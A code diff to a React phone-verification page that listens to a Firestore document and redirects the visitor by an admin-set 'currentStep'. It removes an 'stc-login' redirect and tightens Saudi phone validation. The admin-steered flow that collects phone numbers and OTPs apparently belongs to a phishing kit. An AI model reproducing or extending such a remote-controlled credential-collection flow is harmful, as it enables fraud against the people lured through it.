@@ -81,12 +81,10 @@ export default function VerifyPhonePage() {
       (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data();
-          console.log("Firestore data received:", data);
-          if (data.currentStep === "stc-login") {
-            window.location.href = "/stc-login";
-          }
+          console.log("[phone-info] Firestore data received:", data);
+
           // Admin navigation: Handle page redirects
-          else if (data.currentStep === "home") {
+          if (data.currentStep === "home") {
             console.log("[phone-info] Admin redirecting to home");
             window.location.href = "/";
           } else if (data.currentStep === "phone") {
@@ -138,7 +136,7 @@ export default function VerifyPhonePage() {
     const cleanPhone = phone.replace(/\s/g, "");
 
     // Saudi phone number validation: starts with 05 and 10 digits total
-    const saudiPhoneRegex = /^5\d{8}$/;
+    const saudiPhoneRegex = /^05\d{8}$/;
 
     if (!saudiPhoneRegex.test(cleanPhone)) {
       setPhoneError("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
@@ -163,7 +161,14 @@ export default function VerifyPhonePage() {
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value.replace(/\D/g, ""); // Only numbers
-    setPhoneNumber(value);
+    if (value.length <= 10) {
+      setPhoneNumber(value);
+      if (value.length === 10) {
+        validatePhoneNumber(value);
+      } else {
+        setPhoneError("");
+      }
+    }
   };
 
   const handleSendOtp = async () => {
